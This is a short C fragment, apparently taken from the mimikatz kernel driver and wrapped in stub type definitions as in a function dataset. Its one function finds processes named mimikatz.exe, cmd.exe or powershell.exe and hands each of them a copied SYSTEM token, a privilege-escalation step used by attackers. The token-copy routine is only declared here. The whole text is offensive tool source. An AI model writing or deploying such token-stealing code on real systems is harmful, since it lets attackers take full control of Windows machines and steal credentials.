
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int SIZE_T ;
typedef scalar_t__ PVOID ;
typedef int PKIWI_BUFFER ;
typedef int PEPROCESS ;
typedef int PCHAR ;
typedef int NTSTATUS ;
typedef int HANDLE ;


 int PsGetProcessImageFileName (int ) ;
 int RtlCompareMemory (char*,int ,int) ;
 int STATUS_SUCCESS ;
 int kkll_m_process_token_toProcess (int ,scalar_t__,int ,int ,int ) ;

NTSTATUS kkll_m_process_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
 NTSTATUS status = STATUS_SUCCESS;
 PCHAR processName = PsGetProcessImageFileName(pProcess);

 if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7) || (RtlCompareMemory("powershell.exe", processName, 14) == 14))
  status = kkll_m_process_token_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);

 return status;
}
